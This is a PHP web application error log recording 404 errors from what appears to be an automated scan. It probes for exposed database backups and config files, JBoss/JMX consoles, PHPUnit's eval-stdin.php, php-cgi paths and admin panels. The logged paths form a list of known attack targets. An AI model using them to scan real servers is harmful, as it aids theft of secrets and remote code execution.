2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup_34.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup_34.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-dump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-dump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-backup.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-backup.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113_db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113_db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: create.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: create.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:34 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL solr/admin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:34 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL solr/admin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:34 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL web-console/Invoker was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:34 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL web-console/Invoker was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dbdump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dbdump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL web-console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL web-console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL jmx-console/HtmlAdaptor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL jmx-console/HtmlAdaptor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL servlet was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL servlet was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL jmx-console/HtmlAdaptor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL jmx-console/HtmlAdaptor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL jmx-console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL jmx-console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL invoker/JMXInvokerServlet was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL invoker/JMXInvokerServlet was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL invoker/EJBInvokerServlet was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL invoker/EJBInvokerServlet was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mt/mt-upgrade.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mt/mt-upgrade.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _layouts/scriptresx.ashx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _layouts/scriptresx.ashx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi/mt/mt-upgrade.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi/mt/mt-upgrade.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL jmx-console/HtmlAdaptor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL jmx-console/HtmlAdaptor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL reports/rwservlet was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL reports/rwservlet was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/create.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/create.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpMoAdmin/moadmin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpMoAdmin/moadmin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL $sitepreview/localhost:2006/Wizard was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL $sitepreview/localhost:2006/Wizard was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL reports/rwservlet/showenv was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL reports/rwservlet/showenv was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpmoadmin/moadmin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpmoadmin/moadmin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: moadmin/moadmin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: moadmin/moadmin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/php.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/php.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php-cgi was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php-cgi was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dbdump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dbdump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: railo-context/admin/update.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: railo-context/admin/update.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php4 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php4 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL oauth/authorize was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL oauth/authorize was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/database.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/database.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/php4.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/php4.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.yml_original ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.yml_original ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php4-cgi was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php4-cgi was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.yml~ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.yml~ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: UdVca03lud.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: UdVca03lud.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php5 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php5 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.yml.pgsql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.yml.pgsql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/php5.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/php5.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/backup.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/backup.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.yml.sqlite3 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.yml.sqlite3 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
